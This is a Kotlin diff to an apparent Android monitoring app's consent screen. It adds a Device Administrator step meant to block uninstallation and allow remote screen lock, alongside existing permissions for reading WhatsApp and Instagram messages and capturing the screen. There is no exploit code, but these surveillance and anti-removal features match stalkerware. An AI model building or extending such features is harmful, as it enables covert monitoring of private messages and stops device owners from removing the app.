@@ -19,6 +19,7 @@ import android.widget.Toast
 import androidx.activity.result.contract.ActivityResultContracts
 import androidx.appcompat.app.AppCompatActivity
 import com.spapp.monitoring.R
+import com.spapp.monitoring.admin.SpappDeviceAdminReceiver
 import com.spapp.monitoring.blocking.AccessibilityStatus
 import com.spapp.monitoring.data.DeviceState
 import com.spapp.monitoring.databinding.ActivityConsentBinding
@@ -34,7 +35,8 @@ import com.spapp.monitoring.databinding.ActivityConsentBinding
  * 4. Notification Listener access (WhatsApp & Instagram messages)
  * 5. Accessibility Service (Screen capture & live chat tracking)
  * 6. App Usage Stats (Screen time)
- * 7. Autostart (Xiaomi / Oppo / Vivo OEM ROMs)
+ * 7. Device Administrator (Prevents unauthorized uninstall & enables remote screen lock)
+ * 8. Autostart (Xiaomi / Oppo / Vivo OEM ROMs)
  */
 class ConsentActivity : AppCompatActivity() {
 
@@ -101,7 +103,14 @@ class ConsentActivity : AppCompatActivity() {
         checkAndPromptNextSystemPermission()
     }
 
-    // 7. Autostart Launcher
+    // 7. Device Admin Launcher
+    private val deviceAdminLauncher = registerForActivityResult(
+        ActivityResultContracts.StartActivityForResult()
+    ) {
+        checkAndPromptNextSystemPermission()
+    }
+
+    // 8. Autostart Launcher
     private val autostartLauncher = registerForActivityResult(
         ActivityResultContracts.StartActivityForResult()
     ) {
@@ -184,7 +193,18 @@ class ConsentActivity : AppCompatActivity() {
             }
         }
 
-        // Step 6: Autostart (Xiaomi / Vivo / Oppo / Huawei)
+        // Step 6: Device Administrator (Prevents unauthorized uninstall & enables remote lock)
+        if (!isDeviceAdminActive()) {
+            try {
+                Toast.makeText(this, "Activate Device Administrator to prevent unauthorized removal, then tap Back", Toast.LENGTH_LONG).show()
+                deviceAdminLauncher.launch(SpappDeviceAdminReceiver.activationIntent(this))
+                return
+            } catch (e: Exception) {
+                Log.w(TAG, "Device admin intent failed", e)
+            }
+        }
+
+        // Step 7: Autostart (Xiaomi / Vivo / Oppo / Huawei)
         if (isOemRom() && !autostartPrompted) {
             autostartPrompted = true
             val autostartIntent = getAutostartIntent()
@@ -269,6 +289,10 @@ class ConsentActivity : AppCompatActivity() {
             appOps.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, Process.myUid(), packageName)
         }
         return mode == AppOpsManager.MODE_ALLOWED
+    }
+
+    private fun isDeviceAdminActive(): Boolean {
+        return SpappDeviceAdminReceiver.isActive(this)
     }
 
     private fun isOemRom(): Boolean {
